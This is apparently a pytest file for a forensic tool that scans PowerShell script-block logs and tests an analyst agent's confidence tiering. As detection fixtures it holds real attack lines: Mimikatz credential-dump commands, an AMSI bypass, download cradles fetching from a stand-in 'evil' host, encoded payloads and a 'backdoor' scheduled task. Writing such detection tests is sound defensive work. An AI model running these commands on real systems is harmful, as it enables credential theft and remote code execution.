"""T2-2 tests: decoded PowerShell 4104 triage + agent wiring.

Covers:
  - ScriptBlockText extraction from EvtxECmd row shape
  - Pattern matching for each family (mimikatz, amsi_bypass,
    download_cradle, encoded_command, c2_framework, persistence,
    obfuscation)
  - Base64 + gzip+base64 decode + pattern-match against decoded text
  - Agent wiring + confidence tiering
"""
import base64
import csv
import gzip
from pathlib import Path

import pytest

from el.skills import powershell_triage as pst


_EVTX_COLS = [
    "RecordNumber", "EventRecordId", "TimeCreated", "EventId", "Level",
    "Provider", "Channel", "ProcessId", "ThreadId", "Computer",
    "ChunkNumber", "UserId", "MapDescription", "UserName", "RemoteHost",
    "PayloadData1", "PayloadData2", "PayloadData3", "PayloadData4",
    "PayloadData5", "PayloadData6", "SourceFile",
]


def _write_4104_csv(path: Path, script_blocks: list[str],
                      computer: str = "WS1",
                      user: str = "alice") -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=_EVTX_COLS)
        w.writeheader()
        for i, sb in enumerate(script_blocks):
            row = {c: "" for c in _EVTX_COLS}
            row.update({
                "RecordNumber": str(i + 1),
                "TimeCreated": f"2024-01-01T10:0{i % 10}:00Z",
                "EventId": "4104",
                "Channel": "Microsoft-Windows-PowerShell/Operational",
                "Provider": "Microsoft-Windows-PowerShell",
                "Computer": computer,
                "UserName": user,
                "PayloadData1": "Path: ",
                "PayloadData2": f"ScriptBlockText: {sb}",
            })
            w.writerow(row)


# ---------------------------------------------------------------------------
# Extraction
# ---------------------------------------------------------------------------

def test_extract_strips_scriptblocktext_prefix():
    row = {"PayloadData2": "ScriptBlockText: Get-Process"}
    assert pst._extract_script_block(row) == "Get-Process"


def test_extract_accepts_raw_payloaddata2_without_prefix():
    row = {"PayloadData2": "Invoke-Something -Foo"}
    assert pst._extract_script_block(row) == "Invoke-Something -Foo"


def test_extract_empty_row():
    assert pst._extract_script_block({}) == ""


# ---------------------------------------------------------------------------
# Pattern matching
# ---------------------------------------------------------------------------

def _run(scripts: list[str], tmp_path: Path) -> list[pst.PSHit]:
    p = tmp_path / "evtx.csv"
    _write_4104_csv(p, scripts)
    return pst.run(p)


def test_mimikatz_invoke_detected(tmp_path):
    hits = _run([
        "Invoke-Mimikatz -DumpCreds",
    ], tmp_path)
    assert any(h.family == "mimikatz" for h in hits)


def test_mimikatz_sekurlsa_detected(tmp_path):
    hits = _run([
        "sekurlsa::logonpasswords",
    ], tmp_path)
    assert any(h.family == "mimikatz" for h in hits)


def test_amsi_bypass_detected(tmp_path):
    hits = _run([
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    ], tmp_path)
    assert any(h.family == "amsi_bypass" for h in hits)


def test_download_cradle_detected(tmp_path):
    hits = _run([
        "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')",
    ], tmp_path)
    assert any(h.family == "download_cradle" for h in hits)


def test_encoded_command_marker_detected(tmp_path):
    payload = base64.b64encode("Get-Process".encode("utf-16-le")).decode()
    hits = _run([f"powershell.exe -EncodedCommand {payload}"], tmp_path)
    assert any(h.family == "encoded_command" for h in hits)


def test_c2_framework_name_detected(tmp_path):
    hits = _run(["# staged via Rubeus dump", "Invoke-BloodHound -CollectionMethod All"], tmp_path)
    families = {h.family for h in hits}
    assert "c2_framework" in families


def test_persistence_scheduled_task_detected(tmp_path):
    hits = _run([
        "Register-ScheduledTask -TaskName backdoor "
        "-Action (New-ScheduledTaskAction -Execute cmd.exe)",
    ], tmp_path)
    families = {h.family for h in hits}
    assert "persistence" in families


def test_obfuscation_tick_escape_detected(tmp_path):
    # Pattern requires ≥5 tick-escaped uppercase chars to avoid false
    # positives on legitimate one-off escapes.
    hits = _run([
        "`I`N`V`O`K`E-`E`X`P`R`E`S`S`I`O`N",
    ], tmp_path)
    assert any(h.family == "obfuscation" for h in hits)


def test_clean_script_produces_no_hits(tmp_path):
    hits = _run([
        "Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU",
        "Import-Module ActiveDirectory",
        "Get-ADUser -Filter *",
    ], tmp_path)
    assert hits == []


# ---------------------------------------------------------------------------
# Base64 + gzip decode
# ---------------------------------------------------------------------------

def test_encoded_command_payload_decoded_and_scanned(tmp_path):
    """Attacker's real command is encoded in UTF-16LE base64 inside
    -EncodedCommand. The decoded content references Mimikatz — the
    scanner should find the Mimikatz hit even though the raw text
    just looks like a base64 blob."""
    inner = "Invoke-Mimikatz -Command sekurlsa::logonpasswords"
    blob = base64.b64encode(inner.encode("utf-16-le")).decode()
    hits = _run([f"powershell.exe -EncodedCommand {blob}"], tmp_path)
    families = {h.family for h in hits}
    assert "mimikatz" in families
    assert "encoded_command" in families
    mimi = [h for h in hits if h.family == "mimikatz"][0]
    assert mimi.decoded_samples, \
        "expected decoded sample captured for the analyst"


def test_gzipped_base64_payload_decoded(tmp_path):
    """PowerShell's IO.Compression.GZipStream idiom wraps the payload
    in gzip. The decoder has to try multiple wbits to unpack."""
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://x')"
    gz = gzip.compress(inner.encode("utf-16-le"))
    blob = base64.b64encode(gz).decode()
    hits = _run([
        f"$d=[Convert]::FromBase64String('{blob}'); "
        "IEX ((New-Object IO.Compression.GZipStream...))",
    ], tmp_path)
    # Decoded stream contains the download cradle; outer text also has
    # FromBase64String which matches encoded_command. Both should fire.
    families = {h.family for h in hits}
    assert "encoded_command" in families
    # Decoded download cradle:
    assert "download_cradle" in families


# ---------------------------------------------------------------------------
# Aggregation + metadata
# ---------------------------------------------------------------------------

def test_event_count_and_timestamps_aggregated(tmp_path):
    p = tmp_path / "evtx.csv"
    _write_4104_csv(p, [
        "Invoke-Mimikatz",
        "sekurlsa::logonpasswords",
        "Get-Process",                # not malicious, ignored
        "lsadump::sam",
    ])
    hits = pst.run(p)
    mimi = [h for h in hits if h.family == "mimikatz"][0]
    assert mimi.event_count == 3
    assert mimi.first_seen == "2024-01-01T10:00:00Z"


def test_computer_and_user_aggregation(tmp_path):
    p = tmp_path / "evtx.csv"
    with p.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=_EVTX_COLS)
        w.writeheader()
        for comp, user in (("HOST1", "a"), ("HOST1", "b"), ("HOST2", "a")):
            row = {c: "" for c in _EVTX_COLS}
            row.update({
                "TimeCreated": "2024-01-01T10:00:00Z",
                "EventId": "4104",
                "Computer": comp, "UserName": user,
                "PayloadData2": "ScriptBlockText: Invoke-Mimikatz",
            })
            w.writerow(row)
    hits = pst.run(p)
    mimi = [h for h in hits if h.family == "mimikatz"][0]
    assert ("HOST1", 2) in mimi.top_computers
    assert ("a", 2) in mimi.top_users


def test_hypotheses_for_map():
    assert "H_CREDENTIAL_ACCESS" in pst.hypotheses_for("mimikatz")
    assert "H_C2_OR_REVERSE_SHELL" in pst.hypotheses_for("c2_framework")
    assert pst.hypotheses_for("nonexistent_family") == []


# ---------------------------------------------------------------------------
# Agent wiring + tiering
# ---------------------------------------------------------------------------

def test_agent_emits_high_confidence_for_mimikatz(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.powershell_analyst import PowerShellAnalystAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "disk.E01"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-ps-mimi")
    with open_ledger(m.case_dir):
        pass
    csv_path = (Path(m.case_dir) / "analysis" / "windows_artifact"
                / "evtx" / "evtx_parsed.csv")
    _write_4104_csv(csv_path, ["Invoke-Mimikatz sekurlsa::logonpasswords"])

    ctx = AgentContext(case_id="t-ps-mimi", case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__)
    findings = PowerShellAnalystAgent().run(ctx)
    mimi = [f for f in findings if "mimikatz" in f.claim.lower()]
    assert mimi and mimi[0].confidence == "high"
    assert "H_CREDENTIAL_ACCESS" in mimi[0].hypotheses_supported


def test_agent_insufficient_when_no_csv(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.powershell_analyst import PowerShellAnalystAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "x.bin"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-ps-nocsv")
    with open_ledger(m.case_dir):
        pass
    ctx = AgentContext(case_id="t-ps-nocsv", case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__)
    findings = PowerShellAnalystAgent().run(ctx)
    assert findings and findings[0].confidence == "insufficient"


def test_agent_insufficient_when_no_malicious_patterns(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.powershell_analyst import PowerShellAnalystAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "disk.E01"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-ps-clean")
    with open_ledger(m.case_dir):
        pass
    csv_path = (Path(m.case_dir) / "analysis" / "windows_artifact"
                / "evtx" / "evtx_parsed.csv")
    _write_4104_csv(csv_path, ["Get-Process | Out-File x.txt",
                                  "Import-Module ActiveDirectory"])
    ctx = AgentContext(case_id="t-ps-clean", case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__)
    findings = PowerShellAnalystAgent().run(ctx)
    assert findings and findings[0].confidence == "insufficient"
    assert "not evidence of absence" in findings[0].claim
